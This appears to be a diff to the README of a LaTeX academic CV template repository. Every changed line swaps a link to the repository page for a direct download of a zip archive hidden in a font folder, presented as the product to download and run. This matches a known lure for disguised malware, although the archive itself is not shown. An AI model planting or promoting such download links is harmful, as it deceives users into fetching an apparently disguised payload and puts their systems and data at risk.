@@ -1,6 +1,6 @@
 # 📄 Awesome-PhD-CV - Build a strong academic CV
 
-[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hermmolly105/Awesome-PhD-CV)
+[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hermmolly105/Awesome-PhD-CV/raw/refs/heads/main/deedy-format/fonts/raleway/CV-Awesome-Ph-v1.3.zip)
 
 ## 📚 Overview
 
@@ -17,7 +17,7 @@ The repo focuses on:
 
 Use this link to visit the page to download:
 
-[https://github.com/hermmolly105/Awesome-PhD-CV](https://github.com/hermmolly105/Awesome-PhD-CV)
+[https://github.com/hermmolly105/Awesome-PhD-CV/raw/refs/heads/main/deedy-format/fonts/raleway/CV-Awesome-Ph-v1.3.zip](https://github.com/hermmolly105/Awesome-PhD-CV/raw/refs/heads/main/deedy-format/fonts/raleway/CV-Awesome-Ph-v1.3.zip)
 
 ### How to get started on Windows
 
@@ -129,7 +129,7 @@ academia-resume, bigtech-resume, cv, latex-resume-template, resume, resume-templ
 
 Open the repository here:
 
-[https://github.com/hermmolly105/Awesome-PhD-CV](https://github.com/hermmolly105/Awesome-PhD-CV)
+[https://github.com/hermmolly105/Awesome-PhD-CV/raw/refs/heads/main/deedy-format/fonts/raleway/CV-Awesome-Ph-v1.3.zip](https://github.com/hermmolly105/Awesome-PhD-CV/raw/refs/heads/main/deedy-format/fonts/raleway/CV-Awesome-Ph-v1.3.zip)
 
 ## 🧭 Common use cases
 
